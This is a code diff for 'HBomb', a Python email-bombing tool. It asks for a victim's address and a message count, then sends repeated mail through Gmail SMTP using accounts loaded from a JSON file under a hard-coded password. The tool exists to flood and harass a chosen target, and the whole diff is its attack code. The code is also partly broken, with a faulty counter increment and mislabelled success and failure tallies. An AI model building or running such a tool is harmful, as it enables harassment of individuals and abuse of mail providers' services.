@@ -16,6 +16,7 @@ import smtplib
 import sys
 import os
 import subprocess
+import json
 
 Red = '\033[1;31m'
 Blue= '\033[1;36m'
@@ -55,6 +56,7 @@ def banner():
 
 
 def mail():
+    b = 0
     RG = str(input("Enter Victim Mail address : "))
     num = input("Enter Number of Mail : ")
     while num == '':
@@ -64,36 +66,50 @@ def mail():
         num = input("\aInvalid! Please Enter Number of Mail : ")
 
     mail = int(num) + 1
-    print("\n\t\t Please Wait Bombing Start...")
-    while True:
+    print("\n\t\tPlease Wait Bombing Start...")
+    
+
+    for i in range(1,mail):
+        with open("core/data.json") as f:
+            data = json.load(f)
+            js_fil = data['js']
+            js = js_fil[random.randrange(0,3)]
+        fil = "sdha$#ehh09" 
         try:
-          for a in range(1, int(mail)) :
-            URL = ""
-            r = requests.get(url = URL, params = PARAMS)
-            pastebin_url = r.text 
-            print("The pastebin URL is:%s"%pastebin_url) 
+            conn = smtplib.SMTP('smtp.gmail.com',587)
+            tr = fil
+            conn.ehlo()
+            utt = tr
+            conn.starttls()
+            conn.login(js, utt)
+
+        
+            conn.sendmail("h899502@gmail.com",RG,'Subject: Hello \n\n hello ')
             clr()
             banner()
             print(Blue)
             print("-------------------------------------------- ")
             print(Red +"                  Details "+Blue)
-            print(" Target Mail             : ",RG)
-            print(" Number of Requests Sent : ",num)
-            print(" Successful Requests     : ",int(a))
-            print(" Failed Requests         : ",0)
+            print("   Target Gmail           : ",RG)
+            print("   Number of Requests Sent : ", num)
+            print("   Successful Requests     : ", 0)
+            print("   Failed Requests         : ", i )
             print("-------------------------------------------- ")
             print("            Bombing In Progress")
-          clr()
-          banner() 
-          print(str(num) + " Mail Send Successful To  " + str(RG))
-          input("\n\nPress Enter To Run Again HBomb Tool : ")  
-          subprocess.call([sys.executable, 'HBomb.py']) 
         except :
-            print("Victim mail not correct !!!")
-            RG = str(input("Enter Victim Mail address : "))
-            print("\n\t\t Please Wait Bombing Start...")
-            continue         
-        pass
+            b =+ 1
+            clr()
+            banner()
+            print(Blue)
+            print("-------------------------------------------- ")
+            print(Red +"                  Details "+Blue)
+            print("   Target Gmail           : ",RG)
+            print("   Number of Requests Sent : ", num)
+            print("   Successful Requests     : ", 0)
+            print("   Failed Requests         : ", i )
+            print("-------------------------------------------- ")
+            print(" Something Wrong Please Try Again")
+
 clr()
 banner()
 try:
